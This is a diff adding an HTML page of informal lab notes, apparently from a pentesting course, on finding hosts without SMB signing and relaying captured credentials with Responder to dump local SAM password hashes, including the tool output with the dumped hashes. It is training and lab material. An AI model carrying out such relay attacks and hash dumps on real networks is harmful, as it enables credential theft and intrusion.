@@ -1,0 +1,67 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>7.Discovering hosts with smb signing disabled</title>
+</head><body>one way to find which dont have smb signing enabled is to run a nessus scan <br/>
+and it will gve u the results <br/>
+other way is to run a nmap scan <br/>
+with a aspecific script <br/>
+&nbsp;<br/>
+other way is go to github and find smb signing cecks and u ll find variety of scripts<br/>
+<img src="image 2.png" /><br/>
+nse stands for nmap scripting engine<br/>
+<img src="image.png" /><br/>
+<img src="image 9.png" /><br/>
+server ka ip :192.168.50.143<br/>
+fcastle IPv4 Address. . . . . . . . . . . : 192.168.50.131<br/>
+pparker 192.168.50.132 <br/>
+<img src="image 3.png" /><br/>
+thus by defualt smb signing is enabled and required for the servers(so we cant relay to this machine)<br/>
+bt this is thhe ip address of fcastle so here we can still do a relay attack as its not required<br/>
+<br/>
+so for now lets only attack peter parker hi sirf <br/>
+save ts ip in targets.txt<br/>
+in a perfect workd u would save all the ips to attacked here <br/>
+so what we will do is relay our credentials from 131 wala machine to 132 ie peter parker wala machine <br/>
+turn off smb and http in Responder.conf<br/>
+<img src="image 5.png" />'now setting up relay<br/>
+<img src="image 7.png" /><br/>
+<br/>
+<img src="image 6.png" /><br/>
+now point your punisher machine to your attakce rmachine <br/>
+<img src="image 8.png" /><br/>
+<br/>
+thus we got the thing needed <br/>
+<br/>
+<br/>
+<br/>
+<br/>
+'''<br/>
+main prb is every time u gotta enter the server ka ip address in machines ka and it keeps on chajnging <br/>
+'''<br/>
+<img src="image 4.png" /><br/>
+<br/>
+[*] SMBD-Thread-3: Connection from MARVEL/FCASTLE@192.168.50.131 controlled, attacking target smb://192.168.50.132<br/>
+[*] Authenticating against smb://192.168.50.132 as MARVEL/FCASTLE SUCCEED<br/>
+[*] SMBD-Thread-3: Connection from MARVEL/FCASTLE@192.168.50.131 controlled, but there are no more targets left!<br/>
+[*] Service RemoteRegistry is in stopped state<br/>
+[*] Service RemoteRegistry is disabled, enabling it<br/>
+[*] Starting service RemoteRegistry<br/>
+[*] Target system bootKey: 0xb3a5aaa05b574ae934e70c8c98e96d3e<br/>
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c81c8295ec4bfa3c9b90dcd6c64727e2:::<br/>
+Peter Parker:1001:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::<br/>
+[*] Done dumping SAM hashes for host: 192.168.50.132<br/>
+[*] Stopping service RemoteRegistry<br/>
+[*] Restoring the disabled state for service RemoteRegistry<br/>
+<br/>
+<br/>
+<br/>
+these sam hashes that we got can be cracked using hascat <br/>
+<br/>
+<br/>
+</body></html>
